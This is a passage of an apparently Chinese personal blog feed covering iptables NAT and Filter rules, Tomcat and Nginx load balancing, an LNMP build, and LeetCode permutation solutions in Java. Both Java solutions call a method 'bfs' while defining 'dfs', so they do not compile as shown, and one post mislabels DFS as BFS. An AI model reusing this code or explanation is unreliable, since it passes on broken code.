        <content type="html"><![CDATA[<h2 id="iptables——NAT表"><a href="#iptables——NAT表" class="headerlink" title="iptables——NAT表"></a>iptables——NAT表</h2><h3 id="一、NAT表"><a href="#一、NAT表" class="headerlink" title="一、NAT表"></a>一、NAT表</h3><p>Network Address Translation：解决了Ipv4网络地址不够的问题，一个局域网或多个局域网公用一个公网地址的网络地址转换技术。</p><h3 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h3><blockquote><p>为了模拟互联网外网主机不写网关。</p></blockquote><p>SNAT环境：</p><p><a href="https://imgchr.com/i/apGXnK"><img src="https://s1.ax1x.com/2020/07/26/apGXnK.png" alt="apGXnK.png"></a></p><p>DNAT环境：</p><p><a href="https://imgchr.com/i/apdzrR"><img src="https://s1.ax1x.com/2020/07/26/apdzrR.png" alt="apdzrR.png"></a></p><h3 id="三、iptables——NAT表的规则编写"><a href="#三、iptables——NAT表的规则编写" class="headerlink" title="三、iptables——NAT表的规则编写"></a>三、iptables——NAT表的规则编写</h3><blockquote><p>路由后源地址转换、路由前目标地址转换</p></blockquote><h4 id="1、NAT表的三个链"><a href="#1、NAT表的三个链" class="headerlink" title="1、NAT表的三个链"></a>1、NAT表的三个链</h4><p>1）PREROUTING链：路由前位置的规则</p><p>2）POSTROUTING链：路由后位置的规则</p><p>3）OUTPUT链：出站位置规则</p><h4 id="2、SNAT源地址转换的规则编写"><a href="#2、SNAT源地址转换的规则编写" class="headerlink" title="2、SNAT源地址转换的规则编写"></a>2、SNAT源地址转换的规则编写</h4><p><u>1、POSTROUTING链配置SNAT：</u></p><p>1）手动配置转换的外网地址： <code>iptables -t nat -I/A（原表空的so都行） POSTROUTING -p tcp -o eth1（外网端口） -s 192.168.1.0/24（Ip或者网段都行） -j SNAT(源地址转换) --to-source 外网地址(也可以是一个范围) </code></p><p>2）动态获得转换的外网地址： <code>iptables -t nat -I/A（原表空的so都行） POSTROUTING -p tcp -o eth1（外网端口） -s 192.168.1.0/24（Ip或者网段都行） -j MASQUERADE （一律按照外网端口动态获得的IP地址转换）</code>    </p><p><u>2、需要注意Filter表中的FORWARD规则是否允许数据转发：</u></p><p>清除掉FORWARD的规则使其允许所有转发：<code>iptables -t filter -F FORWARD</code></p><h4 id="3、DNAT目标地址转换的规则编写"><a href="#3、DNAT目标地址转换的规则编写" class="headerlink" title="3、DNAT目标地址转换的规则编写"></a>3、DNAT目标地址转换的规则编写</h4><p><u>1、PREROUTING链配置DNAT：</u></p><p><code>iptables -t nat -A/-I PREROUTING -i ethX（外网端口）-d 外网映射地址 -p tcp（协议） --dport 外网映射端口 -j DNAT --to-destination 内网地址:端口</code></p><p><u>2、需要注意Filter表中的FORWARD规则是否允许数据转发：</u>因为目标地址转换完毕后，源地址和目标地址都和路由的主机无关，所以要检查Filter的FORWARD规则了。</p><p><a href="https://imgchr.com/i/aprstx"><img src="https://s1.ax1x.com/2020/07/26/aprstx.png" alt="aprstx.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10、iptables——Filter表</title>
      <link href="/2020/07/23/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/10%E3%80%81iptables%E2%80%94%E2%80%94Filter%E8%A1%A8/"/>
      <url>/2020/07/23/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/10%E3%80%81iptables%E2%80%94%E2%80%94Filter%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="包过滤防火墙（Centos6由iptables工具控制）"><a href="#包过滤防火墙（Centos6由iptables工具控制）" class="headerlink" title="包过滤防火墙（Centos6由iptables工具控制）"></a>包过滤防火墙（Centos6由iptables工具控制）</h2><h3 id="一、Linux防火墙的发展"><a href="#一、Linux防火墙的发展" class="headerlink" title="一、Linux防火墙的发展"></a>一、Linux防火墙的发展</h3><p>1、在初代Linux防火墙中，防火墙以ipfirewall的形式在内核中单独存在，防火墙规则也写在内核中。</p><p>2、二代Linux防火墙是ipchains(ip链)，二代可以创建和定义规则。</p><p>3、三代Linux防火墙机制就是iptables(ip表)，防火墙的主体在内核中，iptables是用户空间用于创建防火墙规则并与内核中的防火墙进行通信的实体。</p><h3 id="二、iptables的四个功能（表）"><a href="#二、iptables的四个功能（表）" class="headerlink" title="二、iptables的四个功能（表）"></a>二、iptables的四个功能（表）</h3><p>1、raw表与mangle表（很少配置）：数据流量的跟踪与整形。</p><p>2、NAT表(Network Address Translation)</p><p>3、Filter表(过滤表):通过对Filter表中规则编写，限制某些IP地址访问主机的某些服务、过滤主机IP数据包的转发、协议的过滤等。</p><p><a href="https://imgchr.com/i/aprstx"><img src="https://s1.ax1x.com/2020/07/26/aprstx.png" alt="aprstx.png"></a></p><h3 id="三、iptables的基本命令"><a href="#三、iptables的基本命令" class="headerlink" title="三、iptables的基本命令"></a>三、iptables的基本命令</h3><p>查看Filter表的信息：<code>iptables -t filter -nvL</code></p><p>每隔1秒刷新显示一次Filter表信息：<code>watch -n 1（秒数） -d(高亮) iptables -t filter -nvL</code></p><p>重启iptables服务：<code>service iptables restart</code></p><blockquote><p>重启iptables服务后，所有表的规则会按照默认的配置重置。</p></blockquote><h3 id="四、iptables规则的编写"><a href="#四、iptables规则的编写" class="headerlink" title="四、iptables规则的编写"></a>四、iptables规则的编写</h3><blockquote><p>iptables 四表五链：四个功能表、五个配置位置的链； </p><p><a href="https://imgchr.com/i/UztAwF"><img src="https://s1.ax1x.com/2020/07/25/UztAwF.png" alt="UztAwF.png"></a></p><p><strong>控制类型：</strong>ACCEPT允许、DROP直接丢弃、REJECT拒绝必要时有提示、LOG记录日志信息不处理</p><p><strong>选项</strong>：</p><blockquote><p><strong>添加选项</strong>：-A 在链的末尾追加一条规则、-I 在链头插入规则、 -I 链名 n 指定序号n插入</p><p><strong>查看选项</strong>：-L 列出所有的规则条目、 -n 以数字的形式显示地址、端口等信息、 -v 详细显示、 -line-numbers 显示规则的序号</p><p><strong>删除选项</strong>：-D 链名 n， 删除链内指定序号n的规则； -F 清空所有规则(iptables -F或者iptables -t XXX -F)</p><p><strong>默认策略选项</strong>：-P 链名 ACCEPT/DROP，修改某链中没规则匹配时默认执行的操作(缺省是ACCEPT)。</p></blockquote><p><strong>条件：</strong></p><blockquote><p><strong>通用匹配：</strong>通用匹配是条件<u>必须</u>要有的</p><p>协议匹配：-p 协议名</p><p>地址匹配：-s 源地址、-d 目标地址</p><p>接口匹配：-i 入站网卡、-o 出站网卡</p><p><strong>隐含匹配：</strong>隐含匹配非必须条件，用于配合通用匹配</p><p>端口匹配：–sport 源端口、–dport 目的端口</p><p>TCP标记匹配：–tcp-flags 检查TCP报文中被设置的标记(ACK、SYN…)</p><p>ICMP类型匹配：–icmp-type ICMP类型(0、3、8)</p><p><strong>显示匹配：</strong></p><p>多端口匹配：-m multiport –sports | –dports 多端口列表(23,80,443…)</p><p>IP范围匹配：-m iprange –src-range IP范围</p><p>MAC地址匹配：-m mac –mac-source MAC地址</p><p>状态匹配：-m state –state 连接状态(ESTABLISHED…)</p></blockquote></blockquote><h4 id="1、Filter表规则的编写（Filter三个链）："><a href="#1、Filter表规则的编写（Filter三个链）：" class="headerlink" title="1、Filter表规则的编写（Filter三个链）："></a><strong>1、Filter表规则的编写（Filter三个链）：</strong></h4><p><u>1）INPUT链(入站链)：</u></p><blockquote><p><code>iptables -t filter -I（插入写到链头） INPUT -p tcp --dport 80 -j ACCEPT</code>        #允许访问本机80服务</p><p><a href="https://imgchr.com/i/UzUyzn"><img src="https://s1.ax1x.com/2020/07/25/UzUyzn.png" alt="UzUyzn.png"></a></p></blockquote><p><u>2）FORWARD链（转发规则链）：当源地址和目标地址都不是本机IP地址时，遵循该链规则。</u></p><blockquote><p><code>iptables -I FORWARD -s 0.0.0.0/0 -d 0.0.0.0/0 -j DROP</code>        #丢弃所有数据包转发（默认filter表、默认所有协议、默认in out所有接口）</p><p><a href="https://imgchr.com/i/UzNKhj"><img src="https://s1.ax1x.com/2020/07/25/UzNKhj.png" alt="UzNKhj.png"></a></p></blockquote><p><u>3）OUTPUT链(出站链)：</u></p><h3 id="五、防火墙规则的保存"><a href="#五、防火墙规则的保存" class="headerlink" title="五、防火墙规则的保存"></a>五、防火墙规则的保存</h3><p>将当前防火墙的规则配置信息保存到文件中：<code>iptables-save &gt; 目录/文件名</code></p><p>将配置信息导入到防火墙中：<code>iptables-restore &lt; 目录/文件名</code></p><p>将当前防火墙的规则信息存储到根防火墙配置中：<code>service iptables save</code></p><blockquote><p>即修改了iptables的最根本的配置文件/etc/sysconfig/iptables，此后每次重启iptables服务，都会来这个配置文件里面拿规则。</p></blockquote><h3 id="六、实验"><a href="#六、实验" class="headerlink" title="六、实验"></a>六、实验</h3><blockquote><p>环境：Centos6.9 Ftp服务器192.168.1.254； WindowsXP客户机192.168.1.1</p></blockquote><p>1、Centos6.9安装FTP服务器：<code>yum install -y vsftpd</code></p><p>2、开启FTP服务：<code>service vsftpd start</code></p><p>3、设置防火墙规则：<code>iptables -t filter -I INPUT -p tcp --dport 21 -j ACCEPT</code></p><p>4、客户机cmd尝试连接发现成功：<code>ftp 192.168.1.254</code>，用户名:<code>ftp</code>，密码空。ftp用户的家目录/共享目录是/var/ftp</p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>47-全排列 II</title>
      <link href="/2020/07/22/Leetcode/47%E3%80%81%E5%85%A8%E6%8E%92%E5%88%97II/"/>
      <url>/2020/07/22/Leetcode/47%E3%80%81%E5%85%A8%E6%8E%92%E5%88%97II/</url>
      
        <content type="html"><![CDATA[<h2 id="47、全排列-II"><a href="#47、全排列-II" class="headerlink" title="47、全排列 II"></a>47、全排列 II</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/UbBplT"><img src="https://s1.ax1x.com/2020/07/22/UbBplT.png" alt="UbBplT.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>此题在<a href="C:\Users\18265\Desktop\Leetcode\46、全排列.md">46、全排列</a>的基础上，使数组有重复项，并要求排列结果不能重复。分析便知此题是在<a href="C:\Users\18265\Desktop\Leetcode\46、全排列.md">46、全排列</a>的DFS递归回溯的基础上再加上一个典型的排序去重。</p><p>去重的方式就是对数组排序后，在递归中的每一层循环迭代都判断nums[i]是否与nums[i-1]相等（前提是i不是当前层循环的第一位）并且used[i-1]是否为false，如果相等，且used[i-1]为false（如果为true说明已经加入tmp_list，那么nums[i-1]属于上一层的元素了，只有同层元素相邻相等才会产生重复），则直接continue即可，因为必然与nums[i-1]迭代得出的排列结果相同（因为同层且剩下的元素相等）。</p><blockquote><p>DFS递归回溯，排序后，同层相邻相同且未加入到tmp_list中则continue去重。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; permuteUnique(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> length = nums.length;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; tmp_list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">boolean</span>[] used = <span class="keyword">new</span> <span class="keyword">boolean</span>[length];</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        bfs(<span class="number">0</span>, nums, used, tmp_list, res, length);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> depth, <span class="keyword">int</span>[] nums, <span class="keyword">boolean</span>[] used, List&lt;Integer&gt; list, List&lt;List&lt;Integer&gt;&gt; res, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (depth == length) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;(list));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i != <span class="number">0</span> &amp;&amp; nums[i] == nums[i-<span class="number">1</span>] &amp;&amp; !used[i-<span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">                <span class="keyword">if</span>(used[i] == <span class="keyword">false</span>) &#123;</span><br><span class="line">                    used[i] = <span class="keyword">true</span>;</span><br><span class="line">                    list.add(nums[i]);</span><br><span class="line">                    bfs(depth + <span class="number">1</span>, nums, used, list, res, length);</span><br><span class="line">                    list.remove(list.size() - <span class="number">1</span>);</span><br><span class="line">                    used[i] = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>46-全排列</title>
      <link href="/2020/07/22/Leetcode/46%E3%80%81%E5%85%A8%E6%8E%92%E5%88%97/"/>
      <url>/2020/07/22/Leetcode/46%E3%80%81%E5%85%A8%E6%8E%92%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h2 id="46、全排列"><a href="#46、全排列" class="headerlink" title="46、全排列"></a>46、全排列</h2><p><a href="https://leetcode-cn.com/problems/permutations/">https://leetcode-cn.com/problems/permutations/</a></p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/UbtFPO"><img src="https://s1.ax1x.com/2020/07/22/UbtFPO.png" alt="UbtFPO.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>和<a href="C:\Users\18265\Desktop\Leetcode\39、组合总和.md">39、组合总和类似</a>，这道题是一个最经典的BFS回溯做法，通过深度遍历以及回溯，找到所有的排列方式。</p><p><a href="https://imgchr.com/i/UbNimn"><img src="https://s1.ax1x.com/2020/07/22/UbNimn.png" alt="UbNimn.png"></a></p><blockquote><p>经典DFS递归回溯，无需多言</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; permute(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> length = nums.length;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; tmp_list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">boolean</span>[] used = <span class="keyword">new</span> <span class="keyword">boolean</span>[length];</span><br><span class="line">        bfs(<span class="number">0</span>, nums, used, tmp_list, res, length);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> depth, <span class="keyword">int</span>[] nums, <span class="keyword">boolean</span>[] used, List&lt;Integer&gt; list, List&lt;List&lt;Integer&gt;&gt; res, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (depth == length) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;(list));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(used[i] == <span class="keyword">false</span>) &#123;</span><br><span class="line">                    used[i] = <span class="keyword">true</span>;</span><br><span class="line">                    list.add(nums[i]);</span><br><span class="line">                    bfs(depth + <span class="number">1</span>, nums, used, list, res, length);</span><br><span class="line">                    list.remove(list.size() - <span class="number">1</span>);</span><br><span class="line">                    used[i] = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9、Tomcat服务器搭建与Nginx负载均衡</title>
      <link href="/2020/07/22/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/9%E3%80%81Tomcat%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E4%B8%8ENginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"/>
      <url>/2020/07/22/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/9%E3%80%81Tomcat%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E4%B8%8ENginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="Tomcat服务器搭建与Nginx负载均衡"><a href="#Tomcat服务器搭建与Nginx负载均衡" class="headerlink" title="Tomcat服务器搭建与Nginx负载均衡"></a>Tomcat服务器搭建与Nginx负载均衡</h2><h3 id="一、Tomcat的使用场景"><a href="#一、Tomcat的使用场景" class="headerlink" title="一、Tomcat的使用场景"></a>一、Tomcat的使用场景</h3><p>Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，因此主要用于运行JSP 页面和Servlet，功能没有Apache和Nginx功能全面，性能也不及它俩。</p><h3 id="二、部署Tomcat-Web服务器与Tomcat特点"><a href="#二、部署Tomcat-Web服务器与Tomcat特点" class="headerlink" title="二、部署Tomcat Web服务器与Tomcat特点"></a>二、部署Tomcat Web服务器与Tomcat特点</h3><blockquote><p>实验用例是Tomcat免安装版，Tomcat依赖JDK环境，因此如果没有JDK需要安装。</p></blockquote><p>1、解压Tomcat免安装版的压缩包</p><p>2、分析一下网页资源的目录在Webapps</p><blockquote><p>Webapps/ROOT        #默认主页所在的目录</p></blockquote><p>3、开启Tomcat服务 <code>bin/startup.sh</code>，Tomcat的默认端口是8080</p><h3 id="三、Tomcat-Nginx实现负载均衡"><a href="#三、Tomcat-Nginx实现负载均衡" class="headerlink" title="三、Tomcat+Nginx实现负载均衡"></a>三、Tomcat+Nginx实现负载均衡</h3><p><strong>权重</strong>：负载均衡机制通过服务器权重的设置来分配服务器的资源使用。</p><blockquote><p>实验环境：一台Centos6虚拟机部署1个Nginx、2个tomcat服务器</p></blockquote><p><strong>1、将三个服务器在一个机器中部署：</strong></p><p>​    要想在1台虚拟机部署三个Web服务器首先要考虑的就是端口占用问题，Nginx默认80、Tomcat默认8080，因此只需要将其中一个Tomcat端口改为8081即可。</p><p>​    Tomcat服务器配置端口比传统服务器复杂，通过PREFIX/conf/server.xml中对各个标签头port的修改即可。也许不需要 -&gt;（并且需要在第二个tomcat服务器的start.sh和stop.sh中加入<code>export CATALINA_HOME=第二个Tomcat的PREFIX目录路径</code>、<code>export CATALINA_BASE=第二个Tomcat的PREFIX目录路径</code>即可）。</p><p><strong>2、Nginx配置文件中配置负载均衡</strong></p><p>在http{}中加入负载均衡集群配置：</p><blockquote><p>upstream 负载均衡配置块名(tomcat_server) {</p><p>​    server 服务器IP:端口 weight=权值;    #配置负载均衡集群中的服务器地址并赋予权重</p><p>​    server 服务器IP:端口 weight=权值;    #同上</p><p>}</p></blockquote><p>在location / {}中加入代理配置：</p><blockquote><p>proxy_pass http://负载均衡配置块名；    #每当访问nginx的/下的网页都会触发该代理</p></blockquote><h3 id="四、正向代理服务器和反向代理服务器"><a href="#四、正向代理服务器和反向代理服务器" class="headerlink" title="四、正向代理服务器和反向代理服务器"></a>四、正向代理服务器和反向代理服务器</h3><p>1、反向代理服务器：类似于Nginx负载均衡，用户在向服务器请求服务时，对于用户来说不清楚真正为其服务的是哪个服务器，则用户所请求的服务器类型就称为反向代理服务器。（用户已知，服务器未知）</p><p>2、正向代理服务器：用户通过VPN等代理服务器去请求某个服务器，用户请求哪个，为其服务的就是哪个服务器，这种情况为其服务的服务器称为正向代理服务器。（用户是未知，服务器已知）</p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8、LNMP架构搭建(Nginx)</title>
      <link href="/2020/07/22/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/8%E3%80%81LNMP%E6%9E%B6%E6%9E%84%E6%90%AD%E5%BB%BA%EF%BC%88Nginx%EF%BC%89/"/>
      <url>/2020/07/22/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/8%E3%80%81LNMP%E6%9E%B6%E6%9E%84%E6%90%AD%E5%BB%BA%EF%BC%88Nginx%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="LNMP架构搭建（Nginx）"><a href="#LNMP架构搭建（Nginx）" class="headerlink" title="LNMP架构搭建（Nginx）"></a>LNMP架构搭建（Nginx）</h2><h3 id="一、Nginx的优点"><a href="#一、Nginx的优点" class="headerlink" title="一、Nginx的优点"></a>一、Nginx的优点</h3><p>1、处理高并发性更好</p><p>2、系统资源利用率比较高，损耗率很低，稳定(C语言开发)</p><p>3、Nginx是异步IO模型，一个进程对应多个连接；Apache是同步IO模型，一个进程对应一个连接。</p><p>4、处理静态网页的能力更好</p><h3 id="二、Nginx环境的搭建"><a href="#二、Nginx环境的搭建" class="headerlink" title="二、Nginx环境的搭建"></a>二、Nginx环境的搭建</h3><p><u>1、安装Nginx环境，首先需要安装Nginx的运行库/开发环境软件包。</u></p><p><strong>开发环境软件包什么样：</strong>后缀带”-devel”的软件包。</p><p><strong>安装Nginx的开发环境/运行库</strong>：<code>yum install pcre-devel</code>、<code>yum install zlib-devel</code>(在安装系统时选中了开发环境，因此该软件包已安装完毕)</p><p><u>2、源码包的方式安装Nginx服务器</u>：</p><p><strong>源码包老套路，检查编译环境并指定安装路径、程序用户和组，各子目录生成Makefile文件：</strong><code> ./configure --prefix=/usr/local/nginx --with-file-aio（） --with-http_gzip_static_module --with-http_flv_module --with-http_ssl_module --user=nginx --group=nginx --with-http_stub_status_module</code></p><p><strong>编译和安装</strong>：<code>make</code>、<code>make install</code></p><p><u>3、创建Nginx的进程/程序用户，使Nginx程序单独由该用户管理，以保证Nginx服务的安全性</u>：<code>useradd -M -s /sbin/nologin nginx</code>(不要家目录，不可登录)</p><p>4、<u>nginx的prefix工作目录下开启nginx服务</u>：<code>./nginx</code></p><blockquote><p><code>./nginx -?</code>    #查看nginx帮助</p><p><code>./nginx -s </code>    #给nginx进程发信号 stop 停止服务</p></blockquote><h3 id="三、Nginx服务器配置文件介绍"><a href="#三、Nginx服务器配置文件介绍" class="headerlink" title="三、Nginx服务器配置文件介绍"></a>三、Nginx服务器配置文件介绍</h3><blockquote><p>Nginx主配置文件：PREFIX/conf/nginx.conf</p><p>1-10行全局配置、11-14行I/O事件配置、17行以后全是http配置</p></blockquote><p>第3行左右： <code>worker_processes 1;</code>        #Nginx服务使用的CPU核心数</p><p>第13行左右：<code>worker_connections 1024;</code>        #每个进程处理的最大连接数</p><p>35行左右：<code>listen 80</code>        #监听端口<br>36行左右：<code>server_name localhost</code>        #服务IP地址</p><p>43行左右：<code>location / &#123; root html; index index.html index.htm;&#125;</code>    #定义Nginx网页根目录和网页主页索引值</p><h3 id="四、源码包安装PHP并使Nginx可以解析PHP"><a href="#四、源码包安装PHP并使Nginx可以解析PHP" class="headerlink" title="四、源码包安装PHP并使Nginx可以解析PHP"></a>四、源码包安装PHP并使Nginx可以解析PHP</h3><blockquote><p><strong>Nginx默认不支持PHP解析</strong></p></blockquote><p><strong>1、</strong>PHP的依赖开发环境/运行库：<code>libxml2-devel</code>、<code>libjpeg-devel</code>、<code>libpng-devel</code></p><p><strong>2、</strong>压缩源码包</p><p><strong>3、</strong><code> ./configure --prefix=/usr/local/php5 --with-gd --with-zlib --with-config-file-path=/usr/local/php5 --enable-mbstring --enable-fpm --with-jpeg-dir=/usr/lib</code></p><blockquote><p>–with-gd：支持php处理图形的扩展库GD库</p><p>–with-zlib：支持提供数据压缩用的函式库zlib库</p><p>-with-config-file-path=/usr/local/php5：指定自己的php.ini路径</p><p> –enable-mbstring ：mbstring扩展库用于处理多字节字符串（有点像unicode补丁）</p><p>–enable-fpm：开启php-fpm（PHP FastCGI Process Manager）模块，PHP FastCGI 进程管理器，用于管理PHP 进程池的软件，用于接受web服务器的请求。</p><p>–with-jpeg-dir=/usr/lib：设置libjpeg库的安装路径（支持jpeg图片格式）</p></blockquote><p><strong>4、</strong>编译安装：<code>make</code>、<code>make install</code></p><p><strong>5、</strong>先修改php配置文件(PREFIX/etc/php-fpm.conf)的default后缀（默认有后缀）；并将源码路径中的php.ini-development主配置文件拷贝一份到PREFIX/etc/php.ini（默认没有这个主配置文件）</p><p><strong>6、</strong>执行Prefix/sbin/php-fpm从而管理fastcgi（PHP）程序，开启后9000端口也随之开启。</p><p><strong>7、</strong>配置nginx服务器，使其支持PHP脚本并且指定FastiCGI管理服务的IP和端口</p><p>方法1、</p><blockquote><p><strong>PREFIX/conf/fastcgi_params</strong></p><p>fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</p><p>加此条配置目的是告诉php-fpm管理进程php脚本的名字。</p></blockquote><hr><blockquote><p><strong>PREFIX/conf/nginx.conf</strong></p><p>66         location ~ \.php$ {</p><p>67             root           html;</p><p>68             fastcgi_pass   127.0.0.1:9000;</p><p>69             fastcgi_index  index.php;</p><p>70             fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</p><p>71             include        fastcgi_params;</p><p>72         }</p></blockquote><p>方法2、</p><blockquote><p><strong>PREFIX/conf/nginx.conf</strong></p><p>66         location ~ \.php$ {<br>67             root           html;<br>68             fastcgi_pass   127.0.0.1:9000;<br>69             fastcgi_index  index.php;<br>70             include        fastcgi_conf;<br>71         }</p><p>使用fastcgi_conf的话，配置文件里已经存在了<code>fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</code></p></blockquote><h3 id="五、LAMP的PHP和LNMP的PHP有什么不同？"><a href="#五、LAMP的PHP和LNMP的PHP有什么不同？" class="headerlink" title="五、LAMP的PHP和LNMP的PHP有什么不同？"></a>五、LAMP的PHP和LNMP的PHP有什么不同？</h3><p>LAMP中PHP是Apache的一个模块；而在LNMP中PHP独立存在，PHPCgi由PHP-FPM管理，PHP-FPM拥有自己的端口专门处理PHP解析。</p><blockquote><p>引自：<a 